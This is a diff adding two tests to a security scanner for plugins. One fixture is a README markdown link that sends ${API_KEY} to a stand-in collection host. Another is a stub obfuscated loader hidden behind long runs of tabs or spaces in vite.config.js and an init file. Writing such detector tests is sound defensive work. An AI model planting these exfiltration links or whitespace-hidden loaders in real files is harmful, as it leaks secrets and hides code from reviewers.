@@ -566,6 +566,36 @@ class TestScanSkill:
         assert {(fi.line, fi.pattern_id) for fi in result.findings if fi.file == "run.py"} == {
             (2, "provider_key_env_read")}
 
+    def test_minified_json_line_scans_in_linear_time_and_still_flags_link_exfil(self, tmp_path):
+        """A plugin's single-line JSON asset (baked animation presets, ~10 MB) made ``md_link_exfil``
+        retry every ``]`` from every ``[``, so plugin validate never finished. The same line now
+        scans fast, and a markdown link interpolating a variable is still caught."""
+        asset = tmp_path / "presets.json"
+        asset.write_text('{"frames":[{"x":[1.0,2.0],"y":[3,4]}],' * 6000 + "\n", encoding="utf-8")
+        start = time.perf_counter()
+        assert not any(fi.pattern_id == "md_link_exfil" for fi in scan_file(asset, "presets.json"))
+        assert time.perf_counter() - start < 2
+
+        doc = tmp_path / "README.md"
+        doc.write_text("[a] see [report](https://collect.example/?d=${API_KEY})\n", encoding="utf-8")
+        assert any(fi.pattern_id == "md_link_exfil" for fi in scan_file(doc, "README.md"))
+
+    def test_code_pushed_off_screen_by_whitespace_is_critical_in_any_text_file(self, tmp_path):
+        """A loader appended after hundreds of tabs (`vite.config.js`) or spaces (extensionless `init`)
+        is invisible in an editor and on GitHub; both are dangerous. A Markdown table padding its
+        cells is not code and stays clean."""
+        loader = "var z = '-1000';var NX,SX;(function(){var a=[String.fromCharCode(118,97,114)]})();"
+        (tmp_path / "vite.config.js").write_text("export default {};" + "\t" * 266 + loader + "\n", encoding="utf-8")
+        (tmp_path / "init").write_text("'use strict';\ninit();" + " " * 774 + loader + "\n", encoding="utf-8")
+        (tmp_path / "table.md").write_text("| a |" + " " * 300 + "| a long table cell that keeps going on |\n",
+                                           encoding="utf-8")
+        (tmp_path / "run.log").write_text("    x = f()\n" + " " * 349 + "~~~~" + "^" * 44 + "\n", encoding="utf-8")
+        assert not [fi for fi in scan_file(tmp_path / "run.log", "run.log") if fi.pattern_id == "hidden_padded_code"]
+        for name, line in (("vite.config.js", 1), ("init", 2)):
+            [hit] = [fi for fi in scan_file(tmp_path / name, name) if fi.pattern_id == "hidden_padded_code"]
+            assert (hit.severity, hit.line) == ("critical", line)
+        assert not [fi for fi in scan_file(tmp_path / "table.md", "table.md") if fi.pattern_id == "hidden_padded_code"]
+
 
 # ---------------------------------------------------------------------------
 # _check_structure
